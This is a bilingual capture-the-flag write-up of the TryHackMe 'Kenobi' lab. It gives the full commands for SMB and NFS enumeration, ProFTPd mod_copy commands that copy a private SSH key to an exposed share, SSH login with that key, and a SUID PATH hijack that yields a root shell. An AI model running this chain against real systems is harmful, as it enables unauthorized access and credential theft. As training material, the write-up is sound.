# TryHackMe - Kenobi

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Easy |
| OS | Linux |
| Key services | SMB, NFS, FTP/ProFTPd, SSH |

## Attack Chain Overview

```text
Recon -> anonymous SMB note -> NFS export -> ProFTPd mod_copy
  -> copy Kenobi SSH key into /var/tmp
  -> mount NFS and recover id_rsa
  -> SSH as kenobi
  -> SUID /usr/bin/menu PATH hijack
  -> root shell
```

## Resumen en Espanol

Kenobi combina enumeracion de servicios clasicos Linux. SMB permitio leer `log.txt`, NFS expuso `/var`, y ProFTPd con `mod_copy` permitio copiar `/home/kenobi/.ssh/id_rsa` hacia `/var/tmp/id_rsa`. Al montar el export NFS desde Kali, la clave privada quedo accesible y se uso para entrar por SSH como `kenobi`.

La escalada vino de un binario SUID (`/usr/bin/menu`) que llamaba herramientas sin ruta absoluta. Al crear un `curl` malicioso en `/tmp` y anteponer `/tmp` al `PATH`, el binario ejecuto `/bin/sh` con privilegios elevados.

## English Summary

Kenobi is a classic Linux service-enumeration chain. SMB exposed a readable anonymous share, NFS exposed `/var`, and ProFTPd `mod_copy` let the attacker copy Kenobi's private SSH key into `/var/tmp`. Mounting the NFS export made the copied key retrievable, leading to SSH access as `kenobi`.

Privilege escalation came from a SUID binary (`/usr/bin/menu`) that called helper tools without absolute paths. A malicious `curl` placed earlier in `PATH` yielded a root shell.

## Reconnaissance

Tools: [nmap](../../tools/recon/nmap.md), [smbmap](../../tools/recon/smbmap.md), [smbclient](../../tools/recon/smbclient.md).

```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
nmap -sVC -p22,80,445,111,2049,37261,40289,42185,54513 $TARGET -oN service
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $TARGET
smbmap -H $TARGET -u '' -p ''
# What it does: connects to an SMB resource and optionally executes an action.
# Why here: listar, descargar o subir archivos por SMB.
smbclient //$TARGET/anonymous
get log.txt
```

## Initial Access

Full technique: [ProFTPd mod_copy SSH key loot](../../exploits/network-services/proftpd-mod-copy-rsa.md). Related: [NFS mounted file loot](../../exploits/network-services/nfs-mounted-file-loot.md).

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

```bash
mkdir /mnt/kenobiNFS
# What it does: monta un sistema de archivos remoto o local.
# Why here: inspeccionar archivos como si estuvieran en local.
mount $TARGET:/var /mnt/kenobiNFS
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /mnt/kenobiNFS/tmp/id_rsa .
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 600 id_rsa
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh -i id_rsa kenobi@$TARGET
```

## Privilege Escalation

Full technique: [SUID PATH hijack](../../exploits/privesc-linux/suid-path-hijack.md).

```bash
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -perm -u=s -type f 2>/dev/null
# What it does: extracts readable strings from a binary or file.
# Why here: buscar credenciales, rutas o tokens embebidos.
strings /usr/bin/menu
# What it does: changes the current directory.
# Why here: position in the necessary path for the next command.
cd /tmp
# What it does: escribe un comando payload en un archivo o entrada vulnerable.
# Why here: convertir script/ruta escribible en ejecucion de codigo.
echo /bin/sh > curl
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## Key Takeaways

- ES: Cuando FTP y NFS se cruzan, una copia server-side puede convertirse en exfiltracion.
- EN: When FTP and NFS overlap, server-side copy can become file exfiltration.
- ES: SMB anonimo a veces solo da una pista, no el acceso final.
- EN: Anonymous SMB may provide only the clue, not the foothold itself.
- ES: En SUID, `strings` puede revelar llamadas sin ruta absoluta.
- EN: For SUID binaries, `strings` can reveal unqualified helper calls.

## Related Notes

- [nmap](../../tools/recon/nmap.md)
- [smbmap](../../tools/recon/smbmap.md)
- [smbclient](../../tools/recon/smbclient.md)
- [ProFTPd mod_copy SSH key loot](../../exploits/network-services/proftpd-mod-copy-rsa.md)
- [NFS mounted file loot](../../exploits/network-services/nfs-mounted-file-loot.md)
- [SUID PATH hijack](../../exploits/privesc-linux/suid-path-hijack.md)
- [Linux enumeration](../../exploits/enumeration/linux-enumeration.md)


